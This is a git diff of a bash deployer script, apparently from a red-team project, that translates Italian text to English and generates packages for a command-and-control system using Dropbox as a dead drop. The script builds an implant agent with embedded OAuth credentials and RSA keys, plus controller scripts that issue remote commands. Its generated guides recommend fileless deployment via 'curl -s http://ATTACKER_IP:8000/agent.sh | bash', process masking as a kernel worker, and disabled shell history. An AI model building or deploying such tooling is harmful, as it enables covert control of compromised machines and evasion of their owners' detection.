@@ -2,21 +2,21 @@
 
 ################################################################################
 # SCRIPT: deployer.sh
-# DESCRIZIONE: Generatore automatico deployment package per Dropbox C2
+# DESCRIPTION: Automated deployment package generator for Dropbox C2
 #
 # WORKFLOW:
-# 1. VERIFICA TEMPLATE
-# 2. GENERA CHIAVI RSA
-# 3. SETUP OAUTH2 DROPBOX
-# 4. CONFIGURAZIONE PATH E TIMING
-# 5. GENERA CONTROLLER SCRIPTS
-# 6. GENERA AGENT CON CREDENZIALI EMBEDDED
-# 7. CREA DEPLOYMENT PACKAGE
+# 1. VERIFY TEMPLATES
+# 2. GENERATE RSA KEYS
+# 3. SETUP DROPBOX OAUTH2
+# 4. CONFIGURE PATHS AND TIMING
+# 5. GENERATE CONTROLLER SCRIPTS
+# 6. GENERATE AGENT WITH EMBEDDED CREDENTIALS
+# 7. CREATE DEPLOYMENT PACKAGE
 ################################################################################
 
 set -e
 
-# Colori
+# Colors
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -26,20 +26,27 @@ NC='\033[0m'
 
 # === BANNER ===
 clear
-echo -e "${BLUE}"
+echo -e "${CYAN}"
 cat << "EOF"
-╔═══════════════════════════════════════════════════════════════╗
-║                                                               ║
-║        Dropbox C2 System - Deployer v2.3                     ║
-║                                                               ║
-║  Genera deployment package da template esistenti             ║
-║                                                               ║
-╚═══════════════════════════════════════════════════════════════╝
+  ____  ____   ___  ____  ____   _____  __  __   ____   
+ |  _ \|  _ \ / _ \|  _ \| __ ) / _ \ \/ / / ___|___ \ 
+ | | | | |_) | | | | |_) |  _ \| | | \  / | |     __) |
+ | |_| |  _ <| |_| |  __/| |_) | |_| /  \ | |___ / __/ 
+ |____/|_| \_\\___/|_|   |____/ \___/_/\_\ \____|_____|
+
+      Dead-Drop C2 Deployment Generator v2.3
+      
 EOF
 echo -e "${NC}"
+echo -e "${YELLOW}⚠️  Educational & Authorized Testing Only${NC}"
+echo -e "${RED}❌ Unauthorized use is illegal - Use responsibly${NC}"
+echo -e "${BLUE}🔗 github.com/daniomass/dropbox-dead-drop-cloud-c2.git${NC}"
+echo ""
+echo "────────────────────────────────────────────────────────"
+echo ""
 
 # === CHECK TEMPLATE FILES ===
-echo -e "${YELLOW}[CHECK]: Verifica file template...${NC}"
+echo -e "${YELLOW}[CHECK]: Verifying template files...${NC}"
 
 REQUIRED_TEMPLATES=(
     "writer_template.sh"
@@ -49,73 +56,73 @@ REQUIRED_TEMPLATES=(
 
 for file in "${REQUIRED_TEMPLATES[@]}"; do
     if [ ! -f "$file" ]; then
-        echo -e "${RED}[ERROR]: Template mancante: $file${NC}"
-        echo "Assicurati di avere tutti i template nella directory corrente"
+        echo -e "${RED}[ERROR]: Missing template: $file${NC}"
+        echo "Make sure you have all templates in current directory"
         exit 1
     fi
 done
 
-echo -e "${GREEN}[OK]: Tutti i template trovati${NC}"
+echo -e "${GREEN}[OK]: All templates found${NC}"
 
 # === CHECK PREREQUISITES ===
-echo -e "${YELLOW}[CHECK]: Verifica tool necessari...${NC}"
+echo -e "${YELLOW}[CHECK]: Verifying required tools...${NC}"
 for cmd in openssl curl base64 awk sed; do
     if ! command -v $cmd >/dev/null 2>&1; then
-        echo -e "${RED}[ERROR]: $cmd non trovato${NC}"
+        echo -e "${RED}[ERROR]: $cmd not found${NC}"
         exit 1
     fi
 done
-echo -e "${GREEN}[OK]: Tool verificati${NC}"
+echo -e "${GREEN}[OK]: Tools verified${NC}"
 
-# === CREA CARTELLE DEPLOYMENT ===
+# === CREATE DEPLOYMENT FOLDERS ===
 DEPLOY_DIR="deployment_$(date +%Y%m%d_%H%M%S)"
 CONTROLLER_DIR="$DEPLOY_DIR/controller"
 AGENT_DIR="$DEPLOY_DIR/agent"
 
 mkdir -p "$CONTROLLER_DIR" "$AGENT_DIR"
-echo -e "${GREEN}[OK]: Cartella deployment: $DEPLOY_DIR${NC}"
+echo -e "${GREEN}[OK]: Deployment folder: $DEPLOY_DIR${NC}"
 
 # === STEP 1: GENERATE RSA KEYS ===
 echo ""
-echo -e "${CYAN}=== STEP 1/5: Generazione Chiavi RSA ===${NC}"
+echo -e "${CYAN}=== STEP 1/5: RSA Key Generation ===${NC}"
 
 if [ -f "private_key.pem" ] && [ -f "public_key.pem" ]; then
-    echo -e "${YELLOW}[WARNING]: Trovate chiavi RSA esistenti${NC}"
-    read -p "Riutilizzare le chiavi esistenti? (y/n): " reuse_keys
+    echo -e "${YELLOW}[WARNING]: Found existing RSA keys${NC}"
+    read -p "Reuse existing keys? (y/n): " reuse_keys
     if [ "$reuse_keys" = "y" ]; then
         cp private_key.pem "$CONTROLLER_DIR/"
         cp public_key.pem "$CONTROLLER_DIR/"
-        echo -e "${GREEN}[OK]: Chiavi RSA copiate${NC}"
+        echo -e "${GREEN}[OK]: RSA keys copied${NC}"
     else
-        echo "[KEYGEN]: Generazione nuove chiavi RSA 4096-bit..."
+        echo "[KEYGEN]: Generating new RSA 4096-bit keys..."
         openssl genrsa -out "$CONTROLLER_DIR/private_key.pem" 4096 2>/dev/null
         openssl rsa -in "$CONTROLLER_DIR/private_key.pem" -pubout -out "$CONTROLLER_DIR/public_key.pem" 2>/dev/null
         chmod 600 "$CONTROLLER_DIR/private_key.pem"
         chmod 644 "$CONTROLLER_DIR/public_key.pem"
-        echo -e "${GREEN}[OK]: Nuove chiavi RSA generate${NC}"
+        echo -e "${GREEN}[OK]: New RSA keys generated${NC}"
     fi
 else
-    echo "[KEYGEN]: Generazione chiavi RSA 4096-bit (può richiedere 30 secondi)..."
+    echo "[KEYGEN]: Generating RSA 4096-bit keys (may take 30 seconds)..."
     openssl genrsa -out "$CONTROLLER_DIR/private_key.pem" 4096 2>/dev/null
     openssl rsa -in "$CONTROLLER_DIR/private_key.pem" -pubout -out "$CONTROLLER_DIR/public_key.pem" 2>/dev/null
     chmod 600 "$CONTROLLER_DIR/private_key.pem"
     chmod 644 "$CONTROLLER_DIR/public_key.pem"
-    echo -e "${GREEN}[OK]: Chiavi RSA generate${NC}"
+    echo -e "${GREEN}[OK]: RSA keys generated${NC}"
 fi
 
 # === STEP 2: DROPBOX OAUTH2 ===
 echo ""
-echo -e "${CYAN}=== STEP 2/5: Configurazione Dropbox OAuth2 ===${NC}"
+echo -e "${CYAN}=== STEP 2/5: Dropbox OAuth2 Configuration ===${NC}"
 
 if [ -f ".dropbox_refresh_token" ]; then
-    echo -e "${YELLOW}[WARNING]: Trovato .dropbox_refresh_token esistente${NC}"
-    read -p "Riutilizzare configurazione esistente? (y/n): " reuse_config
+    echo -e "${YELLOW}[WARNING]: Found existing .dropbox_refresh_token${NC}"
+    read -p "Reuse existing configuration? (y/n): " reuse_config
     if [ "$reuse_config" = "y" ]; then
         cp .dropbox_refresh_token "$CONTROLLER_DIR/"
         source .dropbox_refresh_token
-        echo -e "${GREEN}[OK]: Configurazione OAuth2 copiata${NC}"
+        echo -e "${GREEN}[OK]: OAuth2 configuration copied${NC}"
     else
-        echo "Configurazione nuova richiesta..."
+        echo "New configuration requested..."
         reuse_config="n"
     fi
 else
@@ -124,23 +131,23 @@ fi
 
 if [ "$reuse_config" = "n" ]; then
     echo ""
-    echo "Serve creare una Dropbox App per ottenere:"
+    echo "You need to create a Dropbox App to obtain:"
     echo "1. APP_KEY"
     echo "2. APP_SECRET"
-    echo "3. AUTHORIZATION CODE (da browser)"
+    echo "3. AUTHORIZATION CODE (from browser)"
     echo ""
     
-    read -p "Hai già una Dropbox App? (y/n): " has_app
+    read -p "Do you already have a Dropbox App? (y/n): " has_app
     
     if [ "$has_app" != "y" ]; then
         echo ""
-        echo -e "${YELLOW}=== GUIDA CREAZIONE DROPBOX APP ===${NC}"
+        echo -e "${YELLOW}=== DROPBOX APP CREATION GUIDE ===${NC}"
         echo "1. https://www.dropbox.com/developers/apps/create"
         echo "2. Scoped access → Full Dropbox"
-        echo "3. Nome: C2_System_$(date +%Y%m%d)"
+        echo "3. Name: C2_System_$(date +%Y%m%d)"
         echo "4. Permissions → files.content.read, files.content.write"
         echo ""
-        read -p "Premi ENTER quando pronto..."
+        read -p "Press ENTER when ready..."
     fi
     
     echo ""
@@ -148,13 +155,13 @@ if [ "$reuse_config" = "n" ]; then
     read -p "APP_SECRET: " APP_SECRET
     
     echo ""
-    echo -e "${YELLOW}Apri questo URL:${NC}"
+    echo -e "${YELLOW}Open this URL:${NC}"
     echo ""
     echo -e "${GREEN}https://www.dropbox.com/oauth2/authorize?response_type=code&client_id=$APP_KEY&token_access_type=offline${NC}"
     echo ""
     read -p "AUTHORIZATION CODE: " AUTH_CODE
     
-    echo "[OAUTH]: Richiesta refresh token..."
+    echo "[OAUTH]: Requesting refresh token..."
     
     response=$(curl -s -X POST https://api.dropboxapi.com/oauth2/token \
         -d code=$AUTH_CODE \
@@ -168,14 +175,14 @@ if [ "$reuse_config" = "n" ]; then
     fi
     
     if [ -z "$REFRESH_TOKEN" ]; then
-        echo -e "${RED}[ERROR]: Impossibile ottenere refresh token${NC}"
-        echo "Risposta: $response"
+        echo -e "${RED}[ERROR]: Unable to obtain refresh token${NC}"
+        echo "Response: $response"
         exit 1
     fi
     
-    echo -e "${GREEN}[OK]: Refresh token ottenuto (${#REFRESH_TOKEN} caratteri)${NC}"
+    echo -e "${GREEN}[OK]: Refresh token obtained (${#REFRESH_TOKEN} characters)${NC}"
     
-    # Salva config
+    # Save config
     cat > "$CONTROLLER_DIR/.dropbox_refresh_token" << EOF
 # Dropbox OAuth2 Configuration
 # Generated: $(date)
@@ -188,12 +195,12 @@ EOF
     chmod 600 "$CONTROLLER_DIR/.dropbox_refresh_token"
 fi
 
-# === STEP 3: CONFIGURAZIONE PATH E TIMING ===
+# === STEP 3: CONFIGURE PATHS AND TIMING ===
 echo ""
-echo -e "${CYAN}=== STEP 3/5: Configurazione Path Dropbox e Timing ===${NC}"
+echo -e "${CYAN}=== STEP 3/5: Dropbox Path and Timing Configuration ===${NC}"
 
 echo ""
-echo -e "${YELLOW}Path Dropbox:${NC}"
+echo -e "${YELLOW}Dropbox Paths:${NC}"
 read -p "Folder path [default: /Machine1]: " input_folder
 FOLDER_PATH=${input_folder:-/Machine1}
 
@@ -207,15 +214,15 @@ read -p "Heartbeat file [default: /heartbeat.txt]: " heartbeat_file
 HEARTBEAT_FILE=${heartbeat_file:-/heartbeat.txt}
 
 echo ""
-echo -e "${YELLOW}Timing Agent:${NC}"
-read -p "Base sleep (secondi) [default: 30]: " input_sleep
+echo -e "${YELLOW}Agent Timing:${NC}"
+read -p "Base sleep (seconds) [default: 30]: " input_sleep
 BASE_SLEEP=${input_sleep:-30}
 
 read -p "Jitter percent [default: 30]: " input_jitter
 JITTER_PERCENT=${input_jitter:-30}
 
 echo ""
-echo -e "${GREEN}[CONFIG]: Configurazione salvata:${NC}"
+echo -e "${GREEN}[CONFIG]: Configuration saved:${NC}"
 echo "  Folder: $FOLDER_PATH"
 echo "  Input: $INPUT_FILE"
 echo "  Output: $OUTPUT_FILE"
@@ -224,39 +231,29 @@ echo "  Sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"
 
 # === STEP 4: COPY & MODIFY CONTROLLER SCRIPTS ===
 echo ""
-echo -e "${CYAN}=== STEP 4/5: Generazione Script Controller ===${NC}"
+echo -e "${CYAN}=== STEP 4/5: Controller Scripts Generation ===${NC}"
 
-# Copia writer
+# Copy writer
 cp writer_template.sh "$CONTROLLER_DIR/writer.sh"
-
-# Sostituisci path in writer.sh
 sed -i "s|INPUT_PATH=\"/Machine1/input.txt\"|INPUT_PATH=\"${FOLDER_PATH}${INPUT_FILE}\"|g" "$CONTROLLER_DIR/writer.sh"
-
 chmod +x "$CONTROLLER_DIR/writer.sh"
 echo -e "${GREEN}[OK]: writer.sh → controller/ (path: ${FOLDER_PATH}${INPUT_FILE})${NC}"
 
-# Copia reader
+# Copy reader
 cp reader_template.sh "$CONTROLLER_DIR/reader.sh"
-
-# Sostituisci path in reader.sh
 sed -i "s|OUTPUT_PATH=\"/Machine1/output.txt\"|OUTPUT_PATH=\"${FOLDER_PATH}${OUTPUT_FILE}\"|g" "$CONTROLLER_DIR/reader.sh"
-
 chmod +x "$CONTROLLER_DIR/reader.sh"
 echo -e "${GREEN}[OK]: reader.sh → controller/ (path: ${FOLDER_PATH}${OUTPUT_FILE})${NC}"
 
 # === STEP 5: GENERATE AGENT WITH EMBEDDED CREDENTIALS ===
 echo ""
-echo -e "${CYAN}=== STEP 5/5: Generazione Agent con credenziali embedded ===${NC}"
+echo -e "${CYAN}=== STEP 5/5: Agent Generation with Embedded Credentials ===${NC}"
 
-# Leggi public key
 PUBLIC_KEY_CONTENT=$(cat "$CONTROLLER_DIR/public_key.pem")
-
-# Genera base64 credenziali (con -w 0 per evitare wrap)
 APP_KEY_B64=$(echo -n "$APP_KEY" | base64 -w 0)
 APP_SECRET_B64=$(echo -n "$APP_SECRET" | base64 -w 0)
 REFRESH_TOKEN_B64=$(echo -n "$REFRESH_TOKEN" | base64 -w 0)
 
-# Splitta public key in 4 chunks
 PUBLIC_KEY_B64=$(echo "$PUBLIC_KEY_CONTENT" | base64 -w 0)
 PK_LEN=${#PUBLIC_KEY_B64}
 CHUNK=$((PK_LEN / 4))
@@ -265,10 +262,8 @@ PK2=$(echo "$PUBLIC_KEY_B64" | cut -c$((CHUNK+1))-$((CHUNK*2)))
 PK3=$(echo "$PUBLIC_KEY_B64" | cut -c$((CHUNK*2+1))-$((CHUNK*3)))
 PK4=$(echo "$PUBLIC_KEY_B64" | cut -c$((CHUNK*3+1))-)
 
-# Copia template agent
 cp agent_template.sh "$AGENT_DIR/agent.sh"
 
-# Replace placeholder credenziali
 sed -i "s|PLACEHOLDER_APP_KEY_B64|$APP_KEY_B64|g" "$AGENT_DIR/agent.sh"
 sed -i "s|PLACEHOLDER_APP_SECRET_B64|$APP_SECRET_B64|g" "$AGENT_DIR/agent.sh"
 sed -i "s|PLACEHOLDER_REFRESH_TOKEN_B64|$REFRESH_TOKEN_B64|g" "$AGENT_DIR/agent.sh"
@@ -277,50 +272,48 @@ sed -i "s|PLACEHOLDER_PK2|$PK2|g" "$AGENT_DIR/agent.sh"
 sed -i "s|PLACEHOLDER_PK3|$PK3|g" "$AGENT_DIR/agent.sh"
 sed -i "s|PLACEHOLDER_PK4|$PK4|g" "$AGENT_DIR/agent.sh"
 
-# Replace placeholder path
 sed -i "s|FOLDER_PATH=\"/Machine1\"|FOLDER_PATH=\"${FOLDER_PATH}\"|g" "$AGENT_DIR/agent.sh"
 sed -i "s|INPUT_FILE=\"/input.txt\"|INPUT_FILE=\"${INPUT_FILE}\"|g" "$AGENT_DIR/agent.sh"
 sed -i "s|OUTPUT_FILE=\"/output.txt\"|OUTPUT_FILE=\"${OUTPUT_FILE}\"|g" "$AGENT_DIR/agent.sh"
 sed -i "s|HEARTBEAT_FILE=\"/heartbeat.txt\"|HEARTBEAT_FILE=\"${HEARTBEAT_FILE}\"|g" "$AGENT_DIR/agent.sh"
 
-# Replace placeholder timing
 sed -i "s|BASE_SLEEP=PLACEHOLDER_BASE_SLEEP|BASE_SLEEP=${BASE_SLEEP}|g" "$AGENT_DIR/agent.sh"
 sed -i "s|JITTER_PERCENT=PLACEHOLDER_JITTER_PERCENT|JITTER_PERCENT=${JITTER_PERCENT}|g" "$AGENT_DIR/agent.sh"
 
 chmod +x "$AGENT_DIR/agent.sh"
 
-echo -e "${GREEN}[OK]: agent.sh → agent/ (credenziali embedded)${NC}"
+echo -e "${GREEN}[OK]: agent.sh → agent/ (embedded credentials)${NC}"
 
 # === GENERATE DOCUMENTATION ===
 echo ""
-echo -e "${CYAN}=== Generazione Documentazione ===${NC}"
+echo -e "${CYAN}=== Documentation Generation ===${NC}"
 
 cat > "$CONTROLLER_DIR/README.txt" << EOF
-=== CONTROLLER - GUIDA RAPIDA ===
+=== CONTROLLER - QUICK GUIDE ===
 
-FILE:
-- private_key.pem          : Chiave RSA privata
-- public_key.pem           : Chiave RSA pubblica
-- .dropbox_refresh_token   : Credenziali OAuth2
-- writer.sh                : Invia comandi
-- reader.sh                : Leggi output
+FILES:
+- private_key.pem          : RSA private key
+- public_key.pem           : RSA public key
+- .dropbox_refresh_token   : OAuth2 credentials
+- writer.sh                : Send commands
+- reader.sh                : Read output
 
-CONFIGURAZIONE:
+CONFIGURATION:
 - Folder: $FOLDER_PATH
 - Input: $INPUT_FILE
 - Output: $OUTPUT_FILE
 - Heartbeat: $HEARTBEAT_FILE
 
-USO:
-  # Normale
+USAGE:
+  # Normal mode
   ./writer.sh whoami
   ./reader.sh
   
-  # Quiet mode (no output verboso)
+  # Quiet mode (no verbose output)
   ./writer.sh -q whoami
   ./reader.sh -q
   
-  # Termina agent
+  # Terminate agent
   ./writer.sh EXIT
 EOF
 
@@ -329,7 +322,7 @@ cat > "$AGENT_DIR/README.txt" << EOF
 
 FILE: agent.sh
 
-CONFIGURAZIONE EMBEDDED:
+EMBEDDED CONFIGURATION:
 - Folder: $FOLDER_PATH
 - Input: $INPUT_FILE
 - Output: $OUTPUT_FILE
@@ -337,11 +330,11 @@ CONFIGURAZIONE EMBEDDED:
 - Sleep: ${BASE_SLEEP}s
 - Jitter: ${JITTER_PERCENT}%
 
-OPZIONI:
-  -q    Quiet mode (no output console)
-  -d    Daemon mode (detach completo dal terminale)
+OPTIONS:
+  -q    Quiet mode (no console output)
+  -d    Daemon mode (complete detach from terminal)
 
-METODI:
+DEPLOYMENT METHODS:
 1. File: ./agent.sh
 2. Quiet: ./agent.sh -q
 3. Daemon: ./agent.sh -d
@@ -349,43 +342,43 @@ METODI:
 5. Fileless: curl http://IP/agent.sh | bash
 6. Screen: screen -dmS c2 ./agent.sh
 
-NOTE:
-- Credenziali già embedded (no config esterna)
+FEATURES:
+- Credentials already embedded (no external config)
 - Process masking: [kworker/u:0]
-- Bash history disabilitata
-- Ctrl+C funziona per kill
+- Bash history disabled
+- Ctrl+C works for kill
 
-KILL:
+TERMINATION:
 - Foreground: Ctrl+C
 - Daemon: ./writer.sh EXIT
-- Hard: pkill -f "kworker/u:0"
+- Hard kill: pkill -f "kworker/u:0"
 EOF
 
 cat > "$DEPLOY_DIR/DEPLOYMENT_GUIDE.txt" << EOF
 ========================================
   DROPBOX C2 - DEPLOYMENT GUIDE
 ========================================
-Generato: $(date)
+Generated: $(date)
 
-CONFIGURAZIONE:
-- Folder Dropbox: $FOLDER_PATH
+CONFIGURATION:
+- Dropbox folder: $FOLDER_PATH
 - Input file: $INPUT_FILE
 - Output file: $OUTPUT_FILE
 - Heartbeat file: $HEARTBEAT_FILE
 - Agent sleep: ${BASE_SLEEP}s (jitter: ${JITTER_PERCENT}%)
 
-PREREQUISITI:
-1. Crea folder su Dropbox: $FOLDER_PATH
-2. Crea 3 file: 
+PREREQUISITES:
+1. Create folder on Dropbox: $FOLDER_PATH
+2. Create 3 files: 
    - ${FOLDER_PATH}${INPUT_FILE}
    - ${FOLDER_PATH}${OUTPUT_FILE}
    - ${FOLDER_PATH}${HEARTBEAT_FILE}
-3. Scrivi "MZ" in ${INPUT_FILE}
+3. Write "MZ" in ${INPUT_FILE}
 
 CONTROLLER:
   cd $CONTROLLER_DIR
   
-  # Normale
+  # Normal mode
   ./writer.sh whoami
   ./reader.sh
   
@@ -394,7 +387,7 @@ CONTROLLER:
   ./reader.sh -q
 
 AGENT:
-  # File su disco
+  # File on disk
   scp $AGENT_DIR/agent.sh user@target:/tmp/
   ssh user@target "bash /tmp/agent.sh"
   
@@ -404,33 +397,33 @@ AGENT:
   # Quiet + Daemon
   ssh user@target "bash /tmp/agent.sh -d -q"
 
-FILELESS (consigliato):
+FILELESS (recommended):
   cd $AGENT_DIR
   python3 -m http.server 8000
   
-  # Su target:
+  # On target:
   curl -s http://ATTACKER_IP:8000/agent.sh | bash
   
   # Daemon mode:
   curl -s http://ATTACKER_IP:8000/agent.sh | bash -s -- -d
 
-SCREEN (riattaccabile):
+SCREEN (reattachable):
   screen -dmS c2_agent bash /tmp/agent.sh
   screen -r c2_agent
 
 TERMINATE:
   ./writer.sh EXIT
-  # oppure
+  # or
   pkill -f "kworker/u:0"
 EOF
 
 # === SUMMARY ===
 echo ""
 echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${GREEN}║              DEPLOYMENT PACKAGE GENERATO!                     ║${NC}"
+echo -e "${GREEN}║              DEPLOYMENT PACKAGE GENERATED!                    ║${NC}"
 echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
 echo ""
-echo -e "${CYAN}Struttura:${NC}"
+echo -e "${CYAN}Structure:${NC}"
 echo "$DEPLOY_DIR/"
 echo "├── controller/"
 echo "│   ├── private_key.pem"
@@ -440,25 +433,25 @@ echo "│   ├── writer.sh"
 echo "│   ├── reader.sh"
 echo "│   └── README.txt"
 echo "├── agent/"
-echo "│   ├── agent.sh (credenziali embedded)"
+echo "│   ├── agent.sh (embedded credentials)"
 echo "│   └── README.txt"
 echo "└── DEPLOYMENT_GUIDE.txt"
 echo ""
-echo -e "${YELLOW}Configurazione:${NC}"
+echo -e "${YELLOW}Configuration:${NC}"
 echo "  Folder: $FOLDER_PATH"
 echo "  Input: $INPUT_FILE"
 echo "  Output: $OUTPUT_FILE"
 echo "  Heartbeat: $HEARTBEAT_FILE"
 echo "  Sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"
 echo ""
-echo -e "${YELLOW}Prossimi passi:${NC}"
-echo "1. Crea $FOLDER_PATH su Dropbox con i 3 file"
-echo "2. Scrivi \"MZ\" in ${FOLDER_PATH}${INPUT_FILE}"
+echo -e "${YELLOW}Next steps:${NC}"
+echo "1. Create $FOLDER_PATH on Dropbox with 3 files"
+echo "2. Write \"MZ\" in ${FOLDER_PATH}${INPUT_FILE}"
 echo "3. cd $CONTROLLER_DIR && ./writer.sh whoami"
-echo "4. Deploy agent (vedi DEPLOYMENT_GUIDE.txt)"
+echo "4. Deploy agent (see DEPLOYMENT_GUIDE.txt)"
 echo ""
-echo -e "${CYAN}Modalità disponibili:${NC}"
-echo "  ./writer.sh -q \"comando\"    # quiet"
+echo -e "${CYAN}Available modes:${NC}"
+echo "  ./writer.sh -q \"command\"    # quiet"
 echo "  ./reader.sh -q               # quiet"
 echo "  ./agent.sh -d                # daemon"
 echo "  ./agent.sh -d -q             # daemon + quiet"
